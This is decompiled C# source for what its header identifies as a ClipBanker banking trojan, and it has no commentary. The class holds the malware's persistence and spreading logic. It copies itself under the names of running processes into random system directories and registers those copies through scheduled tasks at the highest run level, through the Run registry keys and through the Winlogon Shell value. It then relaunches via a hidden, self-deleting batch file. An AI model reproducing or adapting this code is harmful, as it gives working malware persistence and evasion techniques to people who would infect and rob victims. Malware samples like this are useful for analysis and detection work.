// Decompiled with JetBrains decompiler
// Type: 7q2.kcG
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using \u00315d;
using \u0031xm;
using \u0032K4;
using \u003544;
using \u0035J5;
using \u0037q2;
using crD;
using H16;
using Microsoft.Win32;
using P7S;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0037q2
{
  internal static class kcG
  {
    private static Process[] G45 = (Process[]) null;
    private static readonly List<string> C1G = new List<string>()
    {
      "svchost"
    };

    private static Process iCP()
    {
      Process process = kcG.G45[new \u003192().y4D(kcG.G45.Length)];
      while (kcG.C1G.Contains(process.ProcessName))
        process = kcG.G45[new \u003192().y4D(kcG.G45.Length)];
      return process;
    }

    private static string \u00347f([In] string obj0)
    {
      \u003192 obj = new \u003192();
      List<string> list1 = ((IEnumerable<string>) Directory.GetDirectories(obj0)).ToList<string>();
      list1.RemoveAll(kcG.\u0031M7.\u003C\u003E9__3_0 ?? (kcG.\u0031M7.\u003C\u003E9__3_0 = new Predicate<string>(kcG.\u0031M7.\u003C\u003E9.\u003656)));
      string path = list1[obj.Z87(0, list1.Count<string>())];
      int num = obj.Z87(1, list1.Count<string>());
      while (num > 0)
      {
        try
        {
          List<string> list2 = ((IEnumerable<string>) Directory.GetDirectories(path)).ToList<string>();
          list2.RemoveAll(kcG.\u0031M7.\u003C\u003E9__3_1 ?? (kcG.\u0031M7.\u003C\u003E9__3_1 = new Predicate<string>(kcG.\u0031M7.\u003C\u003E9.\u0035Ys)));
          path = list2[obj.Z87(0, list2.Count<string>())];
          --num;
        }
        catch
        {
          break;
        }
      }
      return path;
    }

    private static bool Wv4([In] int obj0, [In] string obj1)
    {
      if (\u0036D4.bSG())
      {
        switch (obj0)
        {
          case 1:
            try
            {
              if (xY7.\u0037U5("schtasks.exe /create /tn \"" + Path.GetFileNameWithoutExtension(obj1) + "\" /sc ONLOGON /tr \"'" + obj1 + "'\" /rl HIGHEST /f") == 0)
              {
                try
                {
                  using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                }
                catch
                {
                  try
                  {
                    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                      registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                  }
                  catch
                  {
                  }
                }
                break;
              }
              break;
            }
            catch
            {
              try
              {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                  registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                  break;
                }
              }
              catch
              {
                try
                {
                  using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                  {
                    registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                    break;
                  }
                }
                catch
                {
                  return false;
                }
              }
            }
          case 2:
            try
            {
              xY7.\u0037U5("schtasks.exe /create /tn \"" + Path.GetFileNameWithoutExtension(obj1) + "\" /sc ONLOGON /tr \"'" + obj1 + "'\" /rl HIGHEST /f");
            }
            catch
            {
            }
            try
            {
              using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
              {
                string str = (string) registryKey.GetValue("Shell");
                registryKey.SetValue("Shell", (object) (str + ", \"" + obj1 + "\""));
              }
            }
            catch
            {
            }
            try
            {
              using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
            }
            catch
            {
            }
            try
            {
              using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
              {
                registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                break;
              }
            }
            catch
            {
              break;
            }
        }
      }
      else
      {
        switch (obj0)
        {
          case 1:
            try
            {
              if (xY7.\u0037U5("schtasks.exe /create /tn \"" + Path.GetFileNameWithoutExtension(obj1) + "\" /sc minute /mo " + new \u003192().Z87(5, 15).ToString() + " /tr \"'" + obj1 + "'\" /f") == 0)
              {
                try
                {
                  using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                }
                catch
                {
                }
                break;
              }
              break;
            }
            catch
            {
              try
              {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                  registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                  break;
                }
              }
              catch
              {
                return false;
              }
            }
          case 2:
            try
            {
              xY7.\u0037U5("schtasks.exe /create /tn \"" + Path.GetFileNameWithoutExtension(obj1) + "\" /sc minute /mo " + new \u003192().Z87(5, 15).ToString() + " /tr \"'" + obj1 + "'\" /f");
            }
            catch
            {
            }
            try
            {
              using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
              {
                registryKey.SetValue(Path.GetFileNameWithoutExtension(obj1), (object) ("\"" + obj1 + "\""));
                break;
              }
            }
            catch
            {
              break;
            }
        }
      }
      return true;
    }

    public static void \u0035x4([In] int obj0)
    {
      if (obj0 == 0 || File.Exists(Path.GetDirectoryName(Ej4.\u0034Jt) + "\\" + aw8.\u00311f(Path.GetFileName(Ej4.\u0034Jt)).Substring(0, 14)))
        return;
      kcG.G45 = Process.GetProcesses();
      List<string> stringList = new List<string>();
      \u003192 obj = new \u003192();
      stringList.Add(Ej4.\u0034Jt);
      if (obj0 == 1 || obj0 == 2)
      {
        for (int index = 0; index < obj.Z87(3, 15); ++index)
        {
          try
          {
            if (obj.Z87(1, 100) >= 50)
            {
              string processName = kcG.iCP().ProcessName;
              string str = kcG.\u00347f(Path.GetPathRoot(Environment.SystemDirectory));
              File.Copy(Ej4.\u0034Jt, str + "\\" + processName + ".exe", true);
              File.WriteAllText(str + "\\" + aw8.\u00311f(processName + ".exe").Substring(0, 14), xY7.\u003842(new \u003192().Z87(10, 1000)));
              stringList.Add(str + "\\" + processName + ".exe");
              kcG.Wv4(obj0, str + "\\" + processName + ".exe");
            }
            else
            {
              Process process = kcG.iCP();
              string path1 = string.Empty;
              while (path1.Length < 3)
              {
                process = kcG.iCP();
                try
                {
                  path1 = \u0036b9.M34(process);
                }
                catch
                {
                }
              }
              string path2 = Path.GetDirectoryName(path1);
              string processName = process.ProcessName;
              string[] files = Directory.GetFiles(path2);
              if (files.Length > 1)
              {
                path2 = path2 + "\\" + Path.GetFileNameWithoutExtension(files[new \u003192().y4D(files.Length)]);
                if (!Directory.Exists(path2))
                  Directory.CreateDirectory(path2);
              }
              File.Copy(Ej4.\u0034Jt, path2 + "\\" + processName + ".exe", true);
              File.WriteAllText(path2 + "\\" + aw8.\u00311f(processName + ".exe").Substring(0, 14), xY7.\u003842(new \u003192().Z87(10, 1000)));
              stringList.Add(path2 + "\\" + processName + ".exe");
              kcG.Wv4(obj0, path2 + "\\" + processName + ".exe");
            }
          }
          catch
          {
            --index;
          }
        }
      }
      else if (obj0 == 3)
      {
        try
        {
          string processName = kcG.iCP().ProcessName;
          string str = ((string) new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>()["AURD"]).Replace("{USERNAME}", \u0036D4.k4d()).Replace("{SYSTEMDRIVE}", Path.GetPathRoot(Environment.SystemDirectory).Replace("\\", ""));
          File.Copy(Ej4.\u0034Jt, str + "\\" + processName + ".exe", true);
          File.WriteAllText(str + "\\" + aw8.\u00311f(processName + ".exe").Substring(0, 14), xY7.\u003842(new \u003192().Z87(10, 1000)));
          stringList.Add(str + "\\" + processName + ".exe");
          kcG.Wv4(2, str + "\\" + processName + ".exe");
        }
        catch
        {
        }
      }
      try
      {
        xY7.i3r("builds", stringList.LE3());
      }
      catch
      {
      }
      xY7.\u003265();
      try
      {
        foreach (object[] objArray in Zk3.qe3)
        {
          try
          {
            ((MethodBase) objArray[0]).Invoke(objArray[1], new object[3]
            {
              (object) Ej4.\u0034Jt,
              (object) obj0,
              (object) stringList
            });
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      try
      {
        if (stringList.Count > 0)
        {
          string path3 = stringList[obj.Z87(0, stringList.Count - 1)];
          while (!File.Exists(path3))
            path3 = stringList[obj.Z87(0, stringList.Count - 1)];
          string path4 = path3;
          if (obj.Z87(0, 100) > 50)
          {
            path4 = xY7.B84() + "\\" + xY7.\u003842(10) + ".bat";
            string contents = "@echo off\r\nw32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul\r\nstart \"\" \"" + path3 + "\"\r\ndel /a /q /f \"" + path4 + "\"";
            File.WriteAllText(path4, contents, (Encoding) new UTF8Encoding(false));
          }
          Process.Start(new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            Verb = \u0036D4.bSG() ? "runas" : "",
            UseShellExecute = true,
            FileName = path4
          });
          Environment.Exit(0);
        }
      }
      catch
      {
      }
      kcG.G45 = (Process[]) null;
    }

    public static void v1S([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3)
    {
      try
      {
        foreach (object[] objArray in Zk3.mB2)
        {
          try
          {
            ((MethodBase) objArray[0]).Invoke(objArray[1], new object[1]
            {
              (object) Ej4.\u0034Jt
            });
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      List<string> stringList = xY7.s12("builds", obj0, obj1, obj2, obj3).dtU<List<string>>();
      stringList.Add(Ej4.\u0034Jt);
      foreach (string path in stringList)
      {
        if (File.Exists(path))
        {
          try
          {
            Process.Start(new ProcessStartInfo("schtasks")
            {
              Arguments = "/Delete /tn \"" + Path.GetFileNameWithoutExtension(path) + "\" /f",
              UseShellExecute = false,
              CreateNoWindow = true
            }).WaitForExit();
          }
          catch
          {
          }
          try
          {
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
              registryKey.DeleteValue(Path.GetFileNameWithoutExtension(path));
          }
          catch
          {
          }
          try
          {
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
            {
              string str = (string) registryKey.GetValue("Shell");
              registryKey.SetValue("Shell", (object) str.Replace(", \"" + path + "\"", ""));
            }
          }
          catch
          {
          }
          try
          {
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
              registryKey.DeleteValue(Path.GetFileNameWithoutExtension(path));
          }
          catch
          {
          }
          try
          {
            File.Delete(path);
            File.Delete(Path.GetDirectoryName(path) + "\\" + aw8.\u00311f(Path.GetFileName(path)).Substring(0, 14));
          }
          catch
          {
          }
        }
      }
      xY7.\u0038n2();
      if (stringList.Count <= 0)
        return;
      xY7.\u00369d("builds", "", obj0, obj1, obj2, obj3);
    }

    [Serializable]
    private sealed class \u0031M7
    {
      public static readonly kcG.\u0031M7 \u003C\u003E9 = new kcG.\u0031M7();
      public static Predicate<string> \u003C\u003E9__3_0;
      public static Predicate<string> \u003C\u003E9__3_1;

      internal bool \u003656([In] string obj0) => obj0.Contains("$");

      internal bool \u0035Ys([In] string obj0) => obj0.Contains("$");
    }
  }
}
